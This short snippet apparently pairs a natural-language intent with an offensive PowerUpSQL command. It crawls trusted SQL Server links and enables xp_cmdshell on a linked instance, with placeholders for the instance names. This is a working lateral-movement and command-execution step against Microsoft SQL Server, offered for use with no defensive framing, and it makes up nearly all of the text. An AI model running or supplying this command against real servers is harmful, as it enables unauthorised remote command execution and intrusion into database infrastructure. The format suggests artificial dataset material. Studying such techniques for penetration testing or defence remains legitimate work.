# Natural language intent:
# If you are sysadmin in some trusted link you can enable xp_cmdshell with:

Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'
